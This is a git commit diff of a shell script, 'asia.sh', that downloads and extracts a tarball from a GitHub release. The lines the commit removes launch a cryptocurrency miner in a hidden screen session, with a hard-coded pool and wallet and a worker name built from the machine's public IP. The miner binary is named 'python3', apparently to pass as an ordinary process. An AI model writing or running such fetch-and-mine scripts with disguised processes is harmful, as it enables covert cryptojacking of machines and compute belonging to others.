6f78e91eafb4253dd833ac5cc0096f80cabb79e4
DotAja <142836390+DotAja@users.noreply.github.com>
2024-10-01 00:26:04 +0700

    Update asia.sh

--- asia.sh
+++ asia.sh
@@ -5,7 +5,3 @@ wget -q -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.ta
 
 # Extract file
 tar -xvf mek
-
-kontol=$(curl -s ifconfig.me)
-# Jalankan command dengan screen dan nama acak
-screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.ASIA-$kontol
